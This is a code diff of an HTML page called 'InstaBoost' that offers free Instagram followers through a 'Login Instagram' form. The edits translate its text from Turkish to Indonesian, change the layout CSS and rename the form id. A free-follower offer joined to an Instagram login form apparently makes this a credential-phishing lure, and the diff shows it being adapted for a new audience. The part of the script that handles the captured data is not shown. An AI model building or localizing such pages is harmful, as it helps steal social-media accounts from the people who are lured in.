@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>InstaBoost | Ücretsiz Instagram Takipçi</title>
+    <title>InstaBoost | Follower Instagram Gratis</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         :root {
@@ -27,9 +27,9 @@
         }
         
         .container {
-            max-width: 1200px;
+            max-width: 1000px;
             margin: 0 auto;
-            padding: 20px;
+            padding: 3px;
         }
         
         header {
@@ -234,7 +234,7 @@
         <div class="main-content">
             <div class="form-container">
                 <h2 class="form-title">Login Instagram</h2>
-                <form id="takipciForm">
+                <form id="followerFrom">
                     <div class="form-group">
                         <label for="username">Username</label>
                         <input type="text" id="username" class="form-control" placeholder="@yourname" required>
@@ -246,9 +246,9 @@
                     </div>
                     
                     <div class="form-group">
-                        <label for="jumlahfollower">Jumlah Follower yang Diinginkan</label>
+                        <label for="jumlahfollower">Jumlah follower yang diinginkan</label>
                         <input type="number" id="jumlahfollower" class="form-control" placeholder="Ex : 100" min="1" max="1000" required>
-                        <small style="display: block; margin-top: 5px; color: #e50f00;">Kamu bisa dapatkan maksimal 1000 pengikut secara gratis sehari sekali</small>
+                        
                     </div>
                     
                     <button type="submit" class="btn">Kirim Follower</button>
@@ -293,7 +293,7 @@
     </footer>
     
     <script>
-        document.getElementById('takipciForm').addEventListener('submit', async function(e) {
+        document.getElementById('followerFrom').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value;
